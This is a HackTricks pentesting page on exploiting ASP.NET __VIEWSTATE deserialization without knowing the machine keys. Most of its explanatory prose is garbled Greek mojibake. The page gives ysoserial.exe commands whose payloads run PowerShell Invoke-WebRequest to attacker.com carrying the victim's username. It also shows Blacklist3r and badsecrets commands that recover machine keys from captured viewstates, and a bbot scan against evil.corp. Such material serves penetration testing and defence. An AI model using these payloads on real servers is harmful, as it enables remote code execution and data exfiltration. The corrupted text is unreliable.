# Exploiting \_\_VIEWSTATE without knowing the secrets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## What is ViewState

**ViewState** Ï‡ÏÎ·ÏƒÎ¹Î¼ÎµÏÎµÎ¹ Ï‰Ï‚ Î· Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ ÏƒÏ„Î¿ ASP.NET Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï„Î®ÏÎ·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÎµÎ»Î¯Î´Î±Ï‚ ÎºÎ±Î¹ ÎµÎ»Î­Î³Ï‡Î¿Ï… ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚. ÎšÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€ÏŒÎ´Î¿ÏƒÎ· Ï„Î¿Ï… HTML Î¼Î¹Î±Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚, Î· Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ ÎºÎ±Î¹ Î¿Î¹ Ï„Î¹Î¼Î­Ï‚ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¹Î±Ï„Î·ÏÎ·Î¸Î¿ÏÎ½ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¼Î¹Î±Ï‚ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ (postback) ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ­Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚ ÏƒÎµ base64. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ­Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÏƒÎµ ÎºÏÏ…Ï†Î¬ Ï€ÎµÎ´Î¯Î± ViewState.

ÎŸÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ViewState Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÎµÎ¾Î®Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ Î® Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚:

* **Base64**:
* Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï„ÏÏ€Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ `EnableViewStateMac` ÎºÎ±Î¹ `ViewStateEncryptionMode` ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÎµ false.
* **Base64 + MAC (Message Authentication Code) Enabled**:
* Î— ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… MAC ÎµÏ€Î¹Ï„Ï…Î³Ï‡Î¬Î½ÎµÏ„Î±Î¹ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± `EnableViewStateMac` ÏƒÎµ true. Î‘Ï…Ï„ÏŒ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Î³Î¹Î± Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ViewState.
* **Base64 + Encrypted**:
* Î— ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÏŒÏ„Î±Î½ Î· Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± `ViewStateEncryptionMode` ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÎµ true, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ViewState.

## Test Cases

Î— ÎµÎ¹ÎºÏŒÎ½Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÎ¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Ï„Î¿ ViewState ÏƒÏ„Î¿ ASP.NET Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… .NET framework. Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î¼Î¹Î± Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Ï„Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï…:

1. Î“Î¹Î± **Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… .NET**, ÏŒÏ„Î±Î½ ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ MAC ÎºÎ±Î¹ ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚, Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ MachineKey, ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎ¹Î¼Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿ Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ.
2. Î“Î¹Î± **ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ 4.5**, ÎµÎ¬Î½ Î¿ MAC ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ Î±Î»Î»Î¬ Î· ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹, Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ MachineKey. Î— Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Ï„Î¿Î½ Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï„Î¿Ï… MachineKey Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï‰Ï‚ "Blacklist3r."
3. Î“Î¹Î± **ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ 4.5**, Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î± Î±Ï€ÏŒ Ï„Î¿ Î±Î½ Î¿ MAC ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ Î® Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚, ÎµÎ¬Î½ Î· ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·, Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ MachineKey. ÎŸ Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï„Î¿Ï… MachineKey ÎµÎ¯Î½Î±Î¹ Î­ÏÎ³Î¿ Î³Î¹Î± Ï„Î¿Î½ "Blacklist3r - Future Development."
4. Î“Î¹Î± **ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ 4.5 ÎºÎ±Î¹ Î¬Î½Ï‰**, ÏŒÎ»Î¿Î¹ Î¿Î¹ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼Î¿Î¯ MAC ÎºÎ±Î¹ ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ (ÎµÎ¯Ï„Îµ ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ ÎµÎ¯Î½Î±Î¹ true, ÎµÎ¯Ï„Îµ Î¿ Î­Î½Î±Ï‚ ÎµÎ¯Î½Î±Î¹ true ÎºÎ±Î¹ Î¿ Î¬Î»Î»Î¿Ï‚ false) Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ MachineKey. ÎŸ MachineKey Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ "Blacklist3r."

### Test Case: 1 â€“ EnableViewStateMac=false and viewStateEncryptionMode=false

Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎµÎ½Ï„ÎµÎ»ÏÏ‚ Ï„Î¿ ViewStateMAC ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î¼Î·Ï„ÏÏÎ¿Ï… `AspNetEnforceViewStateMac` ÏƒÎµ Î¼Î·Î´Î­Î½ ÏƒÏ„Î¿:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Î•Î½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒÏ‚ Î§Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½ ViewState**

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î±Î½ Ï„Î¿ ViewState ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î¿ Î¼Îµ MAC ÎºÎ±Ï„Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î¼Îµ Ï„Î¿ BurpSuite. Î‘Î½ Ï„Î¿ Mac Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Ï„Î·Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 â€“ ÎŒÏ€Ï‰Ï‚ Î· Î´Î¿ÎºÎ¹Î¼Î® 1 Î±Î»Î»Î¬ Ï„Î¿ cookie ViewState Î´ÎµÎ½ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®

ÎŸÎ¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î±Ï†Î±Î¹ÏÎ­ÏƒÎ¿Ï…Î½ Ï„Î¿ ViewState** Î±Ï€ÏŒ Ï„Î¿ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¼Î­ÏÎ¿Ï‚ ÎµÎ½ÏŒÏ‚ HTTP Request (Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î´ÎµÎ½ Î¸Î± Î»Î¬Î²ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ cookie).\
ÎšÎ¬Ï€Î¿Î¹Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÎ¹ ÏŒÏ„Î¹ Î±Î½ Ï„Î¿ **ViewState** ÎµÎ¯Î½Î±Î¹ **Î¼Î· Ï€Î±ÏÏŒÎ½**, Î· Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ® Ï„Î¿Ï…Ï‚ ÎµÎ¯Î½Î±Î¹ **Î±ÏƒÏ†Î±Î»Î®Ï‚** Î±Ï€ÏŒ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… Ï€ÏÎ¿ÎºÏÏ€Ï„Î¿Ï…Î½ Î¼Îµ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Ï„Î¿Ï… ViewState.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¹ÏƒÏ‡ÏÎµÎ¹. Î‘Î½ **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ ViewState** ÏƒÏ„Î¿ ÏƒÏÎ¼Î± Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î¼Îµ Ï„Î¿ ÏƒÎµÎ¹ÏÎ¹Î±ÏƒÎ¼Î­Î½Î¿ payload Î¼Î±Ï‚ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ysoserial, Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎ¿Ï…Î¼Îµ Î±ÎºÏŒÎ¼Î± Î½Î± ÎµÏ€Î¹Ï„ÏÏ‡Î¿Ï…Î¼Îµ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ±** ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ **Î ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· 1**.

### Test Case: 2 â€“ .Net < 4.5 ÎºÎ±Î¹ EnableViewStateMac=true & ViewStateEncryptionMode=false

Î“Î¹Î± Î½Î± **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ ViewState MAC** Î³Î¹Î± Î¼Î¹Î± **ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÏƒÎµÎ»Î¯Î´Î±** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±Î»Î»Î±Î³Î­Ï‚ ÏƒÎµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ aspx:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï„Î¿ ÎºÎ¬Î½Î¿Ï…Î¼Îµ Î³Î¹Î± Ï„Î·Î½ **Î³ÎµÎ½Î¹ÎºÎ®** ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î¬Ï‚ Ï„Î¿ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **web.config** ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ÎšÎ±Î¸ÏÏ‚ Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î· Î¼Îµ MAC, Î±Ï…Ï„Î® Ï„Î· Ï†Î¿ÏÎ¬ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·, Ï€ÏÏÏ„Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î¬Î»Î»Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Î³Î½Ï‰ÏƒÏ„Î¬ machineKeys. Î•Î¯Î½Î±Î¹ Î³ÏÎ±Î¼Î¼Î­Î½Î¿ ÏƒÎµ Python, Î¿Ï€ÏŒÏ„Îµ ÏƒÎµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î¿ Blacklist3r, Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÎµÎ¾Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€ÏŒ Windows. Î“Î¹Î± Ï„Î± .NET viewstates, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ "python blacklist3r", Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î¿ Ï„Î±Ï‡ÏÏ„ÎµÏÎ¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ.

ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ ÎµÎ¯Ï„Îµ Î¼Îµ Ï„Î¿ viewstate ÎºÎ±Î¹ Ï„Î¿Î½ generator Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Î‰, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ ÏƒÏ„Î· ÏƒÏ„Î¿Ï‡Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± Î±Ï€Î¿ÏƒÏ€Î¬ÏƒÎµÎ¹ Ï„Î¿ viewstate Î±Ï€ÏŒ Ï„Î¿ HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Î“Î¹Î± Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ ÎµÏ…Î¬Î»Ï‰Ï„Î± viewstates ÏƒÎµ Î¼ÎµÎ³Î¬Î»Î· ÎºÎ»Î¯Î¼Î±ÎºÎ±, ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï„Î·Î½ ÎºÎ±Ï„Î±Î¼Î­Ï„ÏÎ·ÏƒÎ· Ï…Ï€Î¿Ï„Î¿Î¼Î­Ï‰Î½, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) module:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Ï„Ï…Ï‡ÎµÏÎ¿Î¯ ÎºÎ±Î¹ Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
